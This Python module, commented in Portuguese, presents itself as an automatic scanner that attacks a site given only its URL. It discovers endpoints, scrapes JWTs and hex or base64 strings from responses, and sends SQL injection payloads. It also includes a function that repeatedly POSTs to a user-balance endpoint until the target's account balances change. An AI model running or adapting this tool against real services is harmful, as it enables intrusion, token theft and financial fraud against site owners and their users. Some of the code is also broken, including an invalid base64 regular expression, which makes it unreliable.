"""
Módulo de Scanner Automático
Realiza varredura e ataques automáticos baseados apenas na URL
"""

import re
import json
import logging
from typing import Dict, List, Optional
from urllib.parse import urlparse

from utils.request_builder import RequestBuilder
from utils.proxy_rotator import ProxyRotator
from modules.osint.osint_enhanced import OSINTScanner
from modules.token.jwt_utils import JWTAnalyzer
from modules.crypto.crypto_utils import CryptoAnalyzer
from utils.constants import COMMON_ENDPOINTS, SQL_PAYLOADS
from utils.helpers import is_valid_url
from utils.logger import logger
import asyncio
import logging
import time
from typing import Callable

logger = logging.getLogger(__name__)

class RetryLimitlessException(Exception):
    pass

async def retry_until_success(
    operation: Callable,
    *args,
    max_delay: float = 60.0,
    base_delay: float = 0.5,
    jitter: float = 0.1,
    **kwargs
):
    """
    Executa uma operação assíncrona com tentativas ilimitadas até sucesso.
    Utiliza backoff exponencial adaptativo e logging detalhado.
    """
    attempt = 0
    delay = base_delay
    while True:
        try:
            result = await operation(*args, **kwargs)
            if result:
                logger.info(f"Operação concluída com sucesso após {attempt} tentativas.")
                return result
            else:
                logger.warning(f"Operação retornou resultado inválido na tentativa {attempt}. Retentando...")
        except Exception as exc:
            logger.error(f"Erro na tentativa {attempt}: {exc}", exc_info=True)
        attempt += 1
        sleep_time = min(delay, max_delay) + (jitter * (2 * (0.5 - time.monotonic() % 1)))
        logger.debug(f"Aguardando {sleep_time:.2f}s antes da próxima tentativa.")
        await asyncio.sleep(sleep_time)
        delay = min(delay * 2, max_delay)

class AutoScanner:
    def __init__(self, target_url: str):
        if not is_valid_url(target_url):
            logger.error(f"URL inválida: {target_url}")
            raise ValueError("URL inválida")
        self.target_url = target_url
        self.request_builder = RequestBuilder(self.target_url)
        self.proxy_rotator = ProxyRotator()
        self.osint_scanner = OSINTScanner()
        self.jwt_analyzer = JWTAnalyzer()
        self.crypto_analyzer = CryptoAnalyzer()
        
    def _normalize_url(self, url: str) -> str:
        """Normaliza a URL fornecida"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url.rstrip('/')
        
    async def start_scan(self) -> Dict:
        """Inicia o processo de varredura automática"""
        results = {
            'target': self.target_url,
            'findings': [],
            'vulnerabilities': [],
            'tokens': [],
            'crypto': []
        }
        
        try:
            # 1. Reconhecimento inicial
            logger.info(f"Iniciando reconhecimento de {self.target_url}")
            osint_results = await self.osint_scanner.gather_info(self.target_url)
            results['findings'].extend(osint_results)
            
            # 2. Descoberta de endpoints
            endpoints = await self.discover_endpoints()
            
            # 3. Análise de cada endpoint
            for endpoint in endpoints:
                endpoint_results = await self.analyze_endpoint(endpoint)
                results['findings'].extend(endpoint_results.get('findings', []))
                results['vulnerabilities'].extend(endpoint_results.get('vulnerabilities', []))
                results['tokens'].extend(endpoint_results.get('tokens', []))
                results['crypto'].extend(endpoint_results.get('crypto', []))
                
            # 4. Análise de tokens encontrados
            for token in results['tokens']:
                token_analysis = await self.jwt_analyzer.analyze_token(token)
                if token_analysis:
                    results['vulnerabilities'].extend(token_analysis)
                    
            # 5. Análise de criptografia
            for crypto_item in results['crypto']:
                crypto_analysis = await self.crypto_analyzer.analyze(crypto_item)
                if crypto_analysis:
                    results['vulnerabilities'].extend(crypto_analysis)
                    
        except Exception as e:
            logger.error(f"Erro durante varredura automática: {e}")
            
        return results
        
    async def discover_endpoints(self) -> List[str]:
        """Descobre endpoints ativos"""
        discovered = set()
        
        # Testa endpoints comuns
        for endpoint in COMMON_ENDPOINTS:
            full_url = f"{self.target_url}{endpoint}"
            try:
                response = await self.request_builder.async_get(full_url)
                if response.status_code in [200, 201, 401, 403]:
                    discovered.add(endpoint)
            except Exception as e:
                logger.debug(f"Erro ao testar endpoint {endpoint}: {e}")
                
        return list(discovered)
        
    async def analyze_endpoint(self, endpoint: str) -> Dict:
        """Analisa um endpoint específico"""
        results = {
            'findings': [],
            'vulnerabilities': [],
            'tokens': [],
            'crypto': []
        }
        
        full_url = f"{self.target_url}{endpoint}"
        
        try:
            # 1. Teste básico
            response = await self.request_builder.async_get(full_url)
            
            # 2. Análise de headers
            for header, value in response.headers.items():
                if 'jwt' in header.lower() or 'token' in header.lower():
                    results['tokens'].append({
                        'type': 'header',
                        'name': header,
                        'value': value
                    })
                    
            # 3. Análise de corpo da resposta
            if response.text:
                # Procura por tokens JWT
                jwt_pattern = r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*'
                tokens = re.findall(jwt_pattern, response.text)
                for token in tokens:
                    results['tokens'].append({
                        'type': 'body',
                        'value': token
                    })
                    
                # Procura por padrões de criptografia
                crypto_patterns = {
                    'aes': r'[A-Fa-f0-9]{32,}',
                    'base64': r'[A-Za-z0-9+/]{4}*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?'
                }
                
                for crypto_type, pattern in crypto_patterns.items():
                    matches = re.findall(pattern, response.text)
                    for match in matches:
                        results['crypto'].append({
                            'type': crypto_type,
                            'value': match
                        })
                        
            # 4. Teste de vulnerabilidades
            for payload_type, payloads in SQL_PAYLOADS.items():
                for payload in payloads:
                    try:
                        response = await self.request_builder.async_post(
                            full_url,
                            json={'payload': payload}
                        )
                        if self._check_sql_vulnerability(response):
                            results['vulnerabilities'].append({
                                'type': 'sql_injection',
                                'payload': payload,
                                'endpoint': endpoint
                            })
                    except Exception:
                        continue
                        
        except Exception as e:
            logger.error(f"Erro ao analisar endpoint {endpoint}: {e}")
            
        return results
        
    def _check_sql_vulnerability(self, response) -> bool:
        """Verifica se uma resposta indica vulnerabilidade SQL"""
        error_patterns = [
            'sql',
            'mysql',
            'sqlite',
            'postgresql',
            'oracle',
            'syntax error'
        ]
        
        response_text = response.text.lower()
        return any(pattern in response_text for pattern in error_patterns)

    async def alterar_saldo(self, usuario_id: str, novo_saldo: float) -> bool:
        """
        Implementação real da alteração de saldo.
        Retorna True se sucesso, False caso contrário.
        """
        try:
            # Lógica real de alteração de saldo aqui
            response = await self.request_builder.async_post(
                f"{self.target_url}/api/user/{usuario_id}/saldo",
                json={"saldo": novo_saldo}
            )
            if response.status_code == 200 and "saldo" in response.text:
                logger.info(f"Saldo alterado para usuário {usuario_id}: {novo_saldo}")
                return True
            logger.warning(f"Falha ao alterar saldo para usuário {usuario_id}: {response.text}")
            return False
        except Exception as e:
            logger.error(f"Exceção ao alterar saldo: {e}", exc_info=True)
            return False

    async def alterar_saldo_com_retry(self, usuario_id: str, novo_saldo: float):
        """
        Altera o saldo com tentativas ilimitadas até sucesso.
        """
        return await retry_until_success(self.alterar_saldo, usuario_id, novo_saldo)